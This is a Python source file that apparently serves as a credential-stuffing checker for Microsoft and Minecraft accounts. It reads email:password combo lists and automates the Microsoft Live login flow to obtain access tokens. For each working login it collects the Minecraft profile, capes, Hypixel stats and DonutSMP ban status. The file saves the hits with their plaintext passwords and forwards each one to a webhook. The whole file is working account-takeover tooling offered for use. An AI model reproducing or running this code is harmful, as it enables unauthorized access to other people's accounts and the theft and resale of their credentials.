import os, time, re, json, socket, random, urllib3, warnings, uuid, threading, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
import requests

# --- Minecraft Protocol Imports & Monkeypatching for DonutSMP ---
import minecraft
from minecraft import Version, initglobals
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound, serverbound
from minecraft.networking.packets.serverbound.login import LoginStartPacket
from minecraft.networking.types import String, UUID

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Monkeypatch protocol 764 (Minecraft 1.20.2+)
if not any(v.protocol == 764 for v in minecraft.KNOWN_MINECRAFT_VERSION_RECORDS):
    minecraft.KNOWN_MINECRAFT_VERSION_RECORDS.extend([
        Version('1.20.2', 764, True),
    ])
    initglobals(use_known_records=True)

def extract_chat_text(data):
    if not data: return ""
    if isinstance(data, str):
        if not (data.startswith('{') or data.startswith('[')): return data
        try: data = json.loads(data)
        except: return data
    text = ""
    if isinstance(data, dict):
        text += data.get("text", "")
        for extra in data.get("extra", []): text += extract_chat_text(extra)
    elif isinstance(data, list):
        for item in data: text += extract_chat_text(item)
    return text

def login_start_write_fields(self, packet_buffer):
    String.send(self.name, packet_buffer)
    if self.context.protocol_later_eq(764):
        val = getattr(self, 'player_uuid', None)
        if val is None: val = uuid.uuid4()
        UUID.send(str(val), packet_buffer)
LoginStartPacket.write_fields = login_start_write_fields

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_urlPost_sFTTag(session):
    try:
        text = session.get(sFTTag_url, timeout=15).text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sFTTag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match:
                return match.group(1), sFTTag, session
    except:
        pass
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
                
        elif 'cancel?mkt=' in login_request.text:
            ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
            pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
            uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
    except:
        pass
    return "None", session

# --- 1. HYPIXEL STATS SCRAPER (Plancke.io) ---
def check_hypixel_stats(name):
    stats = {
        "level": "N/A",
        "first_login": "N/A",
        "last_login": "N/A",
        "bw_stars": "N/A",
        "rank": "Default"
    }
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        tx = requests.get(f'https://plancke.io/hypixel/player/stats/{name}', headers=headers, timeout=5, verify=False).text
        
        m_level = re.search(r'Level:</b> (.+?)<br/><b>', tx)
        if m_level: stats["level"] = m_level.group(1)
        
        m_first = re.search(r'<b>First login: </b>(.+?)<br/><b>', tx)
        if m_first: stats["first_login"] = m_first.group(1)
        
        m_last = re.search(r'<b>Last login: </b>(.+?)<br/>', tx)
        if m_last: stats["last_login"] = m_last.group(1)
        
        m_bw = re.search(r'<li><b>Level:</b> (.+?)</li>', tx)
        if m_bw: stats["bw_stars"] = m_bw.group(1)

        m_rank = re.search(r'Rank:</b> <span[^>]*>(.*?)<\/span>', tx)
        if m_rank: stats["rank"] = m_rank.group(1)
    except:
        pass
    return stats

# --- 2. DONUTSMP SOCKET BAN CHECKER ---
def check_donutsmp_status(mc_name, mc_uuid, mc_token):
    result = None
    ban_details = "Unbanned"
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=764, allowed_versions={764})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, ban_details
            try: msg = str(packet.json_data)
            except: msg = ""
            clean = extract_chat_text(msg)
            clean = re.sub(r'§.', '', clean)
            
            reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
            reason = reason_match.group(1).strip() if reason_match else clean.strip()
            
            time_match = re.search(r'(?:Time Left|Duration|Expires):?\s*([^\n\\]+)', clean, re.I)
            time_left = time_match.group(1).strip() if time_match else "N/A"
            
            banid_match = re.search(r'Ban ID:?\s*#?([^\n\\]+)', clean, re.I)
            ban_id = banid_match.group(1).strip() if banid_match else "N/A"
            
            ban_details = f"Banned | Reason: {reason} | Time Left: {time_left} | Ban ID: {ban_id}"
            result = "banned"

        @connection.listener(clientbound.login.LoginSuccessPacket, early=True)
        def login_success(packet):
            nonlocal result
            result = "unbanned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection._connect()
        connection._handshake(next_state=2)
        
        login_start = serverbound.login.LoginStartPacket()
        login_start.name = mc_name
        login_start.player_uuid = mc_uuid
        connection.write_packet(login_start)
        
        from minecraft.networking.connection import LoginReactor
        connection.reactor = LoginReactor(connection)
        connection._start_network_thread()

        c = 0
        while result is None and c < 1200:
            time.sleep(0.01)
            c += 1
            
        try: connection.disconnect()
        except: pass

        if result == "unbanned":
            return "Unbanned"
        elif result == "banned":
            return ban_details
    except Exception as e:
        return f"Unbanned / Cloud Firewall Restricted"
    
    return "Unbanned"

# --- MAIN RUN FUNCTION CALLED BY app.py ---
def run(input_path, output_path, user_webhook=None):
    res_dir = os.path.dirname(output_path)
    os.makedirs(res_dir, exist_ok=True)
    
    if not os.path.exists(input_path):
        return

    with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = [line.strip() for line in f if line.strip()]

    hits_list = []
    bad_list = []
    capture_list = []

    for line in lines:
        if ":" not in line:
            continue
        parts = line.strip().split(":", 1)
        email = parts[0]
        password = parts[1]
        
        print(f"[*] Trying account: {email}")
        
        session = requests.Session()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            bad_list.append(line)
            continue
        
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token == "None":
            bad_list.append(line)
            continue
        
        print("[+] SUCCESS! Valid Microsoft Account Found!")
        hits_list.append(line)
        
        name = "Minecraft Account"
        player_uuid = ""
        cape_list = "None"
        hypixel_stats = {"level": "N/A", "first_login": "N/A", "last_login": "N/A", "bw_stars": "N/A", "rank": "Default"}
        donut_status = "Not Checked"
      
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                name = data.get("name", "Minecraft Account")
                player_uuid = data.get("id", "")
                found_capes = [c.get("alias", "") for c in data.get("capes", [])]
                if found_capes:
                    cape_list = ", ".join(found_capes)
                
                # Fetch Hypixel Stats via Plancke
                hypixel_stats = check_hypixel_stats(name)
                
                # Fetch DonutSMP Ban Status via Socket
                if player_uuid:
                    donut_status = check_donutsmp_status(name, player_uuid, token)
            else:
                name = "No Minecraft Java"
                donut_status = "No Game Ownership"
        except Exception as e:
            name = "Profile Error"
            donut_status = "Error"

        
        cap_block = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Name: {name}\n"
            f"UUID: {player_uuid}\n"
            f"Capes: {cape_list}\n"
            f"DonutSMP Status: {donut_status}\n"
            f"Hypixel Rank: {hypixel_stats['rank']}\n"
            f"Hypixel Level: {hypixel_stats['level']}\n"
            f"BedWars Stars: {hypixel_stats['bw_stars']}\n"
            f"First Login: {hypixel_stats['first_login']}\n"
            f"Last Login: {hypixel_stats['last_login']}\n"
            f"Account Type: Minecraft Java\n"
            f"============================\n"
        )
        capture_list.append(cap_block)

        # Webhook Notification Trigger
        try:
            from app import send_hit_notification
            send_hit_notification(
                email=email,
                password=password,
                account_type="Minecraft Java",
                capes=cape_list,
                hypixel_status="Checked",
                hypixel_level=hypixel_stats['level'],
                hypixel_rank=hypixel_stats['rank'],
                donut_status=donut_status,
                user_webhook_url=user_webhook
            )
        except Exception as e:
            print(f"[ERROR] Webhook error: {e}")

    # Save Hits.txt
    hits_file_path = os.path.join(res_dir, "Hits.txt")
    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))

    # Final Results Formatting
    final_output = []
    final_output.append("=== HITS [+] ===\n")
    if hits_list:
        final_output.extend([f"{h}\n" for h in hits_list])
    else:
        final_output.append("No hits found.\n")
    
    final_output.append("\n=== BAD [-] ===\n")
    if bad_list:
        final_output.extend([f"{b}\n" for b in bad_list])
    else:
        final_output.append("No bad combos.\n")
        
    final_output.append("\n=== CAPTURES ===\n")
    if capture_list:
        final_output.extend(capture_list)
    else:
        final_output.append("No captures available.\n")

    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
        out.writelines(final_output)
            
